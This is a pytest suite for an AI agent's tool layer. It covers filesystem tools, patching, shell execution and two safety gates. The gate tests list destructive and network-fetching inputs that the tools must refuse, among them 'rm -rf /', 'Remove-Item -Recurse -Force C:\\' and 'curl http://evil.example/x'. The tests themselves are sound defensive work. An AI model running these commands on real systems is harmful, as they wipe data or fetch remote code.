"""EXT-001 tool-plane tests: every deterministic execution primitive behaves to
its requirement contract. No model calls — pure deterministic verification, which
is exactly the kind of evidence PRIME-001 Tenet 3 (reproducible & honest) demands.

Tools live in .jaros-data/tools (not an installed package), so we load each by path
the same way the Jaros daemon does.
"""

from __future__ import annotations

import importlib.util
from pathlib import Path

import pytest

from jaros.core import create_decision

TOOLS_DIR = Path(__file__).resolve().parents[1] / ".jaros-data" / "tools"


def _load_tool(filename: str, classname: str):
    path = TOOLS_DIR / filename
    spec = importlib.util.spec_from_file_location(f"tool_{path.stem}", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return getattr(module, classname)()


def _decision(dtype: str, payload):
    return create_decision(id=f"t-{dtype}", source="test", type=dtype, payload=payload)


# --- REQ-1 fs.read ---------------------------------------------------------

def test_fs_read_returns_content_and_counts(tmp_path):
    tool = _load_tool("fs_read_tool.py", "FsReadTool")
    f = tmp_path / "a.txt"
    f.write_text("line1\nline2\n", encoding="utf-8")
    out = tool.execute(_decision("fs.read", {"path": str(f)}))
    assert out["content"] == "line1\nline2\n"
    assert out["lines"] == 2
    assert out["truncated"] is False


def test_fs_read_rejects_missing_path():
    tool = _load_tool("fs_read_tool.py", "FsReadTool")
    assert tool.validate(_decision("fs.read", {})).ok is False


# --- REQ-2 fs.list ---------------------------------------------------------

def test_fs_list_sorted_entries(tmp_path):
    tool = _load_tool("fs_list_tool.py", "FsListTool")
    (tmp_path / "b.txt").write_text("x", encoding="utf-8")
    (tmp_path / "a").mkdir()
    out = tool.execute(_decision("fs.list", {"path": str(tmp_path)}))
    assert [e["name"] for e in out["entries"]] == ["a", "b.txt"]
    assert out["entries"][0]["type"] == "dir"
    assert out["entries"][1]["type"] == "file"


# --- REQ-3 fs.grep ---------------------------------------------------------

def test_fs_grep_finds_matches_sorted(tmp_path):
    tool = _load_tool("fs_grep_tool.py", "FsGrepTool")
    (tmp_path / "x.py").write_text("def foo():\n    return 1\n", encoding="utf-8")
    out = tool.execute(_decision("fs.grep", {"pattern": r"def \w+", "path": str(tmp_path)}))
    assert out["count"] == 1
    assert out["matches"][0]["line"] == 1


def test_fs_grep_rejects_bad_regex():
    tool = _load_tool("fs_grep_tool.py", "FsGrepTool")
    assert tool.validate(_decision("fs.grep", {"pattern": "("})).ok is False


# --- REQ-4 code.apply_patch ------------------------------------------------

def test_apply_patch_unique_edit(tmp_path):
    tool = _load_tool("apply_patch_tool.py", "ApplyPatchTool")
    f = tmp_path / "c.py"
    f.write_text("x = 1\n", encoding="utf-8")
    out = tool.execute(_decision("code.apply_patch", {"path": str(f), "old": "x = 1", "new": "x = 2"}))
    assert out["applied"] is True
    assert f.read_text(encoding="utf-8") == "x = 2\n"


def test_apply_patch_rejects_non_unique(tmp_path):
    tool = _load_tool("apply_patch_tool.py", "ApplyPatchTool")
    f = tmp_path / "d.py"
    f.write_text("a\na\n", encoding="utf-8")
    with pytest.raises(RuntimeError):
        tool.execute(_decision("code.apply_patch", {"path": str(f), "old": "a", "new": "b"}))


def test_apply_patch_creates_new_file(tmp_path):
    tool = _load_tool("apply_patch_tool.py", "ApplyPatchTool")
    f = tmp_path / "sub" / "new.txt"
    out = tool.execute(_decision("code.apply_patch", {"path": str(f), "old": "", "new": "hello"}))
    assert out["created"] is True
    assert f.read_text(encoding="utf-8") == "hello"


# --- REQ-6 code.write_file -------------------------------------------------

def test_write_file_overwrites(tmp_path):
    tool = _load_tool("write_file_tool.py", "WriteFileTool")
    f = tmp_path / "deep" / "w.py"
    out = tool.execute(_decision("code.write_file", {"path": str(f), "content": "ok\n"}))
    assert out["applied"] is True and out["created"] is True
    assert f.read_text(encoding="utf-8") == "ok\n"


def test_write_file_rejects_non_string_content():
    tool = _load_tool("write_file_tool.py", "WriteFileTool")
    assert tool.validate(_decision("code.write_file", {"path": "x", "content": 5})).ok is False


# --- REQ-11 generated-code safety gate -------------------------------------

import pytest as _pt


@_pt.mark.parametrize("bad", [
    "import os\nos.system('rm -rf /')\n",
    "import subprocess\nsubprocess.run(['x'])\n",
    "import socket\n",
    "import urllib.request\n",
    "import requests\n",
    "import shutil\nshutil.rmtree('/')\n",
    "eval('1+1')\n",
    "exec('x=1')\n",
    "import pickle\npickle.loads(b'')\n",
])
def test_write_file_refuses_unsafe_generated_code(bad):
    tool = _load_tool("write_file_tool.py", "WriteFileTool")
    assert tool.validate(_decision("code.write_file", {"path": "s.py", "content": bad})).ok is False


@_pt.mark.parametrize("good", [
    "def add(a, b):\n    return a + b\n",
    "def title_case(s):\n    return ' '.join(w.capitalize() for w in s.split())\n",
    "def rle(s):\n    out=[]\n    for c in s:\n        out.append(c)\n    return ''.join(out)\n",
])
def test_write_file_allows_safe_solution_code(good):
    tool = _load_tool("write_file_tool.py", "WriteFileTool")
    assert tool.validate(_decision("code.write_file", {"path": "s.py", "content": good})).ok is True


def test_apply_patch_refuses_unsafe_new_text(tmp_path):
    tool = _load_tool("apply_patch_tool.py", "ApplyPatchTool")
    d = _decision("code.apply_patch", {"path": "s.py", "old": "x", "new": "import os; os.system('x')"})
    assert tool.validate(d).ok is False


# --- REQ-5 shell.exec ------------------------------------------------------

def test_shell_exec_captures_output():
    tool = _load_tool("shell_exec_tool.py", "ShellExecTool")
    out = tool.execute(_decision("shell.exec", {"command": "python -c \"print(7*6)\""}))
    assert out["exitCode"] == 0
    assert out["stdout"].strip() == "42"
    assert out["timedOut"] is False


def test_shell_exec_rejects_empty():
    tool = _load_tool("shell_exec_tool.py", "ShellExecTool")
    assert tool.validate(_decision("shell.exec", {"command": ""})).ok is False


# --- REQ-8 py.check --------------------------------------------------------

def test_py_check_valid(tmp_path):
    tool = _load_tool("py_check_tool.py", "PyCheckTool")
    out = tool.execute(_decision("py.check", {"code": "def f():\n    return 1\n"}))
    assert out["valid"] is True


def test_py_check_invalid_reports_line(tmp_path):
    tool = _load_tool("py_check_tool.py", "PyCheckTool")
    out = tool.execute(_decision("py.check", {"code": 'x = "unterminated\n'}))
    assert out["valid"] is False
    assert out["line"] == 1


def test_py_check_rejects_empty():
    tool = _load_tool("py_check_tool.py", "PyCheckTool")
    assert tool.validate(_decision("py.check", {})).ok is False


# --- REQ-9 py.symbols ------------------------------------------------------

def test_py_symbols_lists_defs():
    tool = _load_tool("py_symbols_tool.py", "PySymbolsTool")
    code = "def a():\n    pass\n\nclass B:\n    def m(self):\n        pass\n\ndef c():\n    pass\n"
    out = tool.execute(_decision("py.symbols", {"code": code}))
    names = [(s["name"], s["kind"]) for s in out["symbols"]]
    assert names == [("a", "function"), ("B", "class"), ("c", "function")]


def test_py_symbols_rejects_empty():
    tool = _load_tool("py_symbols_tool.py", "PySymbolsTool")
    assert tool.validate(_decision("py.symbols", {})).ok is False


# --- REQ-10 fs.find --------------------------------------------------------

def test_fs_find_matches_glob(tmp_path):
    tool = _load_tool("fs_find_tool.py", "FsFindTool")
    (tmp_path / "a.py").write_text("x", encoding="utf-8")
    (tmp_path / "sub").mkdir()
    (tmp_path / "sub" / "b.py").write_text("y", encoding="utf-8")
    (tmp_path / "c.txt").write_text("z", encoding="utf-8")
    out = tool.execute(_decision("fs.find", {"pattern": "*.py", "path": str(tmp_path)}))
    assert out["count"] == 2
    assert all(m.endswith(".py") for m in out["matches"])


def test_fs_find_rejects_empty():
    tool = _load_tool("fs_find_tool.py", "FsFindTool")
    assert tool.validate(_decision("fs.find", {})).ok is False


# --- REQ-7 shell.exec safety denylist (unattended-safe) --------------------

import pytest as _pytest


@_pytest.mark.parametrize("cmd", [
    "curl http://evil.example/x",
    "wget https://example.com/p",
    "git push origin main",
    "pip install requests",
    "rm -rf /",
    "del /q C:\\Windows",
    "Remove-Item -Recurse -Force C:\\",
    "shutdown /s",
    "sudo rm file",
    "python -c \"import urllib.request\"",
])
def test_shell_exec_denies_unsafe(cmd):
    tool = _load_tool("shell_exec_tool.py", "ShellExecTool")
    assert tool.validate(_decision("shell.exec", {"command": cmd})).ok is False


@_pytest.mark.parametrize("cmd", [
    "python -m pytest -q",
    "python script.py",
    "ls -la",
])
def test_shell_exec_allows_safe_build_commands(cmd):
    tool = _load_tool("shell_exec_tool.py", "ShellExecTool")
    assert tool.validate(_decision("shell.exec", {"command": cmd})).ok is True
